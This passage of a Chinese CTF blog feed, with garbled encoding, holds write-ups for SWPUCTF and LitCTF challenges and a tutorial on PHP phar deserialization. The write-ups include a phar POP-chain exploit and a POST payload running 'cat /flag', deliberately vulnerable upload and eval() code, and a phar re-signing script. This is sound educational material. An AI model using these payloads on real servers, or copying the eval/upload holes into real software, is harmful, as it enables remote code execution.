class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$upload_path</span>=<span class=\"string\">&quot;upload/&quot;</span>.<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">time</span>()).<span class=\"string\">&quot;.txt&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$upload_path</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;æ–‡ä»¶è·¯å¾„ï¼š&quot;</span>.<span class=\"variable\">$upload_path</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>read.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$filename</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$filename</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$file</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">zz</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"><span class=\"variable\">$contents</span>=<span class=\"variable\">$file</span>-&gt;<span class=\"title function_ invoke__\">getFile</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;br&gt;</span><br><span class=\"line\">&lt;textarea <span class=\"class\"><span class=\"keyword\">class</span>=&quot;<span class=\"title\">file_content</span>&quot; <span class=\"title\">type</span>=&quot;<span class=\"title\">text</span>&quot; <span class=\"title\">value</span>=&lt;?<span class=\"title\">php</span> <span class=\"title\">echo</span> &quot;&lt;<span class=\"title\">br</span>&gt;&quot;.$<span class=\"title\">contents</span>;?&gt;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br></pre></td></tr></table></figure>\n<p>payload:<br>\n é“¾å­:aa-&gt;zz:toString-&gt;zz:write-&gt;ff:get-&gt;xx:call</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">aa</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">zz</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ff</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$func</span> = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;content = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">xx</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zz</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;filename = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ff</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">xx</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">aa</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;8.phar&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">; <span class=\"comment\">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>(); <span class=\"comment\">//å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class=\"comment\">//è®¾ç½®stubï¼Œstubæ˜¯ä¸€ä¸ªç®€å•çš„phpæ–‡ä»¶ã€‚PHPé€šè¿‡stubè¯†åˆ«ä¸€ä¸ªæ–‡ä»¶ä¸ºPHARæ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ç‚¹ç»•è¿‡æ–‡ä»¶ä¸Šä¼ æ£€æµ‹</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$a</span>); <span class=\"comment\">//è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;flag.txt&quot;</span>, <span class=\"string\">&quot;flag&quot;</span>); <span class=\"comment\">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>(); <span class=\"comment\">//åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span></span><br></pre></td></tr></table></figure>\n<p>post:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file=phar://upload/928215588a1ae876d70bbd84f0446e4c.txt&amp;method=write&amp;var=content&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"45swpuctf-2022-æ–°ç”Ÿèµ›js_sign\"><a class=\"markdownIt-Anchor\" href=\"#45swpuctf-2022-æ–°ç”Ÿèµ›js_sign\">#</a> 45.[SWPUCTF 2022 æ–°ç”Ÿèµ›] js_sign</h2>\n<p><mark>è€ƒç‚¹:tapcode æ•²å‡»ç </mark><br>\næ‰“å¼€ä¹‹åçœ‹æºä»£ç ï¼Œçœ‹ main.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&quot;button&quot;</span>)[<span class=\"number\">0</span>].<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;click&quot;</span>, <span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">    flag=<span class=\"string\">&quot;33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_\">btoa</span>(flag.<span class=\"property\">value</span>) == <span class=\"string\">&#x27;dGFwY29kZQ==&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;you got hint!!!&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;fuck off !!&quot;</span>);</span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><code>dGFwY29kZQ==</code>  ç»è¿‡ base64 è§£ç æ˜¯ tapcode, è¿™æ˜¯ä¸€ç§åŠ å¯†æ–¹å¼ï¼Œ<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oaWVuY29kZS5jb20vdGFwY29kZS5odG1s\"> è§£å¯†ç½‘ç«™</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3343431344215434452124331421311122125444113513341415</span><br><span class=\"line\">n(N) s(S) s(S) c(C) t(T) f(F) y(Y) o(O) u(U) f(F) i(I) n(N) d(D) f(F) l(L) a(A) g(G) b(B) y(Y) t(T) a(A) p(P) c(C) o(O) d(D) e(E)</span><br><span class=\"line\">åˆèµ·æ¥å°±æ˜¯flag</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://hq185187.github.io/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "Pharååºåˆ—åŒ–å­¦ä¹ ",
            "date_published": "2023-06-03T06:32:34.711Z",
            "content_html": "<h3 id=\"phar\"><a class=\"markdownIt-Anchor\" href=\"#phar\">#</a> Phar</h3>\n<p>phar æ˜¯ PHP çš„å‹ç¼©æ–‡æ¡£ï¼Œç±»ä¼¼ Java çš„ jar åŒ…ï¼Œå¯ä»¥æŠŠå¤šä¸ªæ–‡ä»¶å­˜æ”¾è‡³åŒä¸€æ–‡ä»¶ï¼Œæ— éœ€è§£å‹ï¼ŒPHP å°±å¯ä»¥è®¿é—®å¹¶æ‰§è¡Œå†…éƒ¨è¯­å¥</p>\n<h3 id=\"pharæ–‡ä»¶ç»“æ„\"><a class=\"markdownIt-Anchor\" href=\"#pharæ–‡ä»¶ç»“æ„\">#</a> phar æ–‡ä»¶ç»“æ„</h3>\n<ol>\n<li>a stub, æ˜¯ phar æ–‡ä»¶å¤´ï¼Œè¿™ä¸ª stub å°±æ˜¯ä¸€ä¸ªç®€å•çš„ PHP æ–‡ä»¶ï¼Œå®ƒçš„æ ¼å¼æœ‰è¦æ±‚ï¼š</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure>\n<p><mark>å‰é¢çš„å†…å®¹ä¸é™åˆ¶ï¼Œä½†__HALT_COMPILER () å¿…é¡»å­˜åœ¨</mark></p>\n<ol start=\"2\">\n<li>\n<p>manifest, å‹ç¼©æ–‡ä»¶ä¿¡æ¯ï¼Œå­˜å‚¨æ–‡ä»¶çš„å±æ€§ï¼Œæƒé™ç­‰ä¿¡æ¯<br>\nè¿™é‡Œä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨äº†ç”¨æˆ·è‡ªå®šä¹‰çš„ Meta-data, å› æ­¤æ˜¯ååºåˆ—åŒ–çš„æ”»å‡»ç‚¹</p>\n</li>\n<li>\n<p>contentsï¼Œå‹ç¼©æ–‡ä»¶å†…å®¹</p>\n</li>\n<li>\n<p>signatureï¼Œç­¾åï¼Œä½äºæ–‡ä»¶æœ«å°¾<br>\nç­¾è¯å°¾éƒ¨çš„ 01 ä»£è¡¨ md5 åŠ å¯†ï¼Œ02 ä»£è¡¨ sha1 åŠ å¯†ï¼Œ04 ä»£è¡¨ sha256 åŠ å¯†ï¼Œ08 ä»£è¡¨ sha512 åŠ å¯†<br>\nå½“æˆ‘ä»¬ä¿®æ”¹æ–‡ä»¶çš„å†…å®¹æ—¶ï¼Œç­¾åå°±ä¼šå˜å¾—æ— æ•ˆï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦æ›´æ¢ä¸€ä¸ªæ–°çš„ç­¾åï¼Œè„šæœ¬ï¼š</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha1</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;test.phar&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">    f = file.read() </span><br><span class=\"line\">s = f[:-<span class=\"number\">28</span>] <span class=\"comment\"># è·å–è¦ç­¾åçš„æ•°æ®</span></span><br><span class=\"line\">h = f[-<span class=\"number\">8</span>:] <span class=\"comment\"># è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯†</span></span><br><span class=\"line\">newf = s + sha1(s).digest() + h <span class=\"comment\"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;newtest.phar&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">    file.write(newf) <span class=\"comment\"># å†™å…¥æ–°æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"pharååºåˆ—åŒ–\"><a class=\"markdownIt-Anchor\" href=\"#pharååºåˆ—åŒ–\">#</a> Phar ååºåˆ—åŒ–</h3>\n<h4 id=\"pharååºåˆ—åŒ–åŸå› \"><a class=\"markdownIt-Anchor\" href=\"#pharååºåˆ—åŒ–åŸå› \">#</a> phar ååºåˆ—åŒ–åŸå› </h4>\n<p>phar æ–‡ä»¶ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„ Meta-data,PHP ä½¿ç”¨ phar_parse_metadata åœ¨è§£æ meta æ•°æ®æ—¶ï¼Œä¼šè°ƒç”¨ php_var_unserialize è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p>\n<h4 id=\"æ¡ä»¶\"><a class=\"markdownIt-Anchor\" href=\"#æ¡ä»¶\">#</a> æ¡ä»¶</h4>\n<ol>\n<li>phar æ–‡ä»¶èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œæ¯”å¦‚ file_get_contents (),fopen () ç­‰å‡½æ•°</li>\n<li>æœ‰å¯ä»¥åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•</li>\n<li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œâ€pharâ€œï¼Œâ€œ/â€ï¼Œâ€œ:â€ è¿™äº›å­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</li>\n<li>php.ini çš„ phar.readonly é€‰é¡¹éœ€è¦ä¸º Off</li>\n</ol>\n<p>#### éœ€è¦åˆ©ç”¨å‚æ•°çš„å‡½æ•°<br>\n file_get_contents,fopen,file_put_contents,copy ç­‰ç­‰ï¼Œ<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbWcyMDIyLmNuYmxvZ3MuY29tL2Jsb2cvMTgzNTY1Ny8yMDIyMTAvMTgzNTY1Ny0yMDIyMTAxMzAwMTYyMzIwOS0zOTQ3MDAxOTAucG5n\">https://img2022.cnblogs.com/blog/1835657/202210/1835657-20221013001623209-394700190.png</span></p>\n<p>### ç”Ÿæˆ phar æ–‡ä»¶</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>=<span class=\"string\">&quot;qwq&quot;</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">test</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;name=<span class=\"string\">&quot;phpinfo();&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$phartest</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">phar</span>(<span class=\"string\">&#x27;phartest.phar&#x27;</span>,<span class=\"number\">0</span>);<span class=\"comment\">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();<span class=\"comment\">//å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$a</span>);<span class=\"comment\">//è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class=\"comment\">//è®¾ç½®stubï¼Œstubæ˜¯ä¸€ä¸ªç®€å•çš„phpæ–‡ä»¶ã€‚PHPé€šè¿‡stubè¯†åˆ«ä¸€ä¸ªæ–‡ä»¶ä¸ºPHARæ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨è¿™ç‚¹ç»•è¿‡æ–‡ä»¶ä¸Šä¼ æ£€æµ‹</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;test&quot;</span>);<span class=\"comment\">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();<span class=\"comment\">//åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>å¤ç°ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>=<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span>-&gt;name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$phardemo</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;phar://phartest.phar/test.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$phardemo</span>;</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/14/LitCTF2023/",
            "url": "https://hq185187.github.io/2023/05/14/LitCTF2023/",
            "title": "LitCTF2023",
            "date_published": "2023-05-14T12:20:25.426Z",
            "content_html": "<h2 id=\"1æˆ‘flagå‘¢\"><a class=\"markdownIt-Anchor\" href=\"#1æˆ‘flagå‘¢\">#</a> 1. æˆ‘ Flag å‘¢ï¼Ÿ</h2>\n<p>F12 æŸ¥çœ‹æºä»£ç </p>\n<h2 id=\"2å¯¼å¼¹è¿·è¸ª\"><a class=\"markdownIt-Anchor\" href=\"#2å¯¼å¼¹è¿·è¸ª\">#</a> 2. å¯¼å¼¹è¿·è¸ª</h2>\n<p>æŸ¥çœ‹æºä»£ç æ‰¾åˆ° game.js æ–‡ä»¶ï¼Œæ‰¾åˆ° {return â€˜GOT F|L|A|G {y0u_w1n_th1s_!!!}â€™;}, ä»¥ NSSCTF å½¢å¼äº¤å°±å¯ä»¥<br>\nï¼[[Pasted image 20230514194556.png]]</p>\n<h2 id=\"3phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€\"><a class=\"markdownIt-Anchor\" href=\"#3phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€\">#</a> 3.PHP æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼</h2>\n<p>å¯ä»¥ä¹‹é—´è¿è¡Œ php ä»£ç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;ls /&#x27;</span>));</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;cat /flag&#x27;</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"4follow-me-and-hack-me\"><a class=\"markdownIt-Anchor\" href=\"#4follow-me-and-hack-me\">#</a> 4.Follow me and hack me</h2>\n<p>hackbar ä¼ å‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">post:</span><br><span class=\"line\">Challenge=i&#x27;m_c0m1ng</span><br><span class=\"line\">get</span><br><span class=\"line\">?CTF=Lit2023</span><br></pre></td></tr></table></figure>\n<h2 id=\"5vim-yyds\"><a 